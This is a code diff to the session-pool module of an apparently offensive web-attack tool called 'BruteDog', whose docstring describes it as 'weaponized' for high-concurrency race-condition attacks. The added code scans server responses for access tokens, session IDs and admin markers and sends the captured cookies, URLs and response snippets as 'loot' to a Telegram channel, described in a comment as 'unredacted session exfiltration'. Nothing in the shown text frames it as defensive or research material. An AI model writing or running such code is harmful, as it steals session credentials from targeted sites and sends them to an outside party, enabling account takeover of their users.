@@ -2,13 +2,30 @@ import httpx
 import logging
 from typing import Dict, Any, Optional, Union
 
+# Import centralized Telegram broadcaster for unredacted session exfiltration
+from modules.telegram_notifier import send_telegram_alert
+
 logger = logging.getLogger("BruteDog.SessionPool")
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
+    try:
+        import asyncio
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            import asyncio
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 class PersistentSessionPool:
     """
     Manages persistent sessions, cookie jars, and headers across HTTP/2 multiplexed 
     requests to prevent session drops during high-concurrency race conditions.
-    Weaponized with automatic CSRF synchronization and wrapper request handlers.
+    Weaponized with automatic CSRF synchronization, wrapper request handlers, 
+    and real-time Telegram telemetry broadcasting.
     """
     def __init__(self, base_url: str, verify_ssl: bool = False, http2: bool = True):
         self.base_url = base_url.rstrip("/")
@@ -95,7 +112,6 @@ class PersistentSessionPool:
         with self.get_client(timeout=timeout) as client:
             try:
                 if method.upper() == "POST":
-                    # Support both form data and json payloads seamlessly
                     if payload and any(isinstance(v, (dict, list)) for v in payload.values()):
                         resp = client.post(url, json=payload)
                     else:
@@ -109,13 +125,22 @@ class PersistentSessionPool:
                 if resp.cookies:
                     self.cookie_jar.update(resp.cookies)
 
-                # Check if a Set-Cookie header came through in raw form
                 set_cookie = resp.headers.get("set-cookie") or resp.headers.get("Set-Cookie")
                 if set_cookie:
                     self.sync_cookies(set_cookie)
+
+                # Check for high-value authentication or session leakage in response
+                body_lower = resp.text.lower()
+                if resp.status_code in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin"]):
+                    session_loot = {
+                        "url": f"{self.base_url}{url}",
+                        "status": resp.status_code,
+                        "cookies": dict(self.cookie_jar),
+                        "response_snippet": resp.text[:300]
+                    }
+                    broadcast_tg_alert_sync("Session Pool Loot Captured", session_loot)
 
                 return resp.status_code, dict(resp.headers), resp.text
             except Exception as e:
                 logger.error(f"[-] Request failed for {method} {url}: {e}")
                 return 0, {}, str(e)
-
